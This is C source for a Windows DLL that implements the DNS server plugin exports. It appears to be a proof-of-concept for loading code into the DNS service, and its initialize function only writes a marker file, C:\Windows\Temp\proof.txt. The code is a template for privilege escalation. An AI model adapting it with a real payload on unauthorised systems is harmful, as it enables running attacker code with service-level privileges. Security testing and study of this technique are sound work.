#include <windows.h>

BOOL APIENTRY DllMain( 
	HMODULE module,
	DWORD  reason_for_call,
	LPVOID reserved
) {
    return TRUE;
}

__declspec(dllexport) 
DWORD WINAPI DnsPluginInitialize(
    PVOID pDnsAllocateFunction,
    PVOID pDnsFreeFunction
) {
    HANDLE handle = CreateFileW(
        L"C:\\Windows\\Temp\\proof.txt",
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (handle != INVALID_HANDLE_VALUE) {
        CloseHandle(handle);
    }

    return ERROR_SUCCESS;
}

__declspec(dllexport)
DWORD WINAPI DnsPluginCleanup()
{
    return ERROR_SUCCESS;
}

__declspec(dllexport)
DWORD WINAPI DnsPluginQuery(
    PSTR pszQueryName,
    WORD wQueryType,
    PSTR pszRecordOwnerName,
    PVOID ppDnsRecordListHead
) {
    return ERROR_SUCCESS;
}
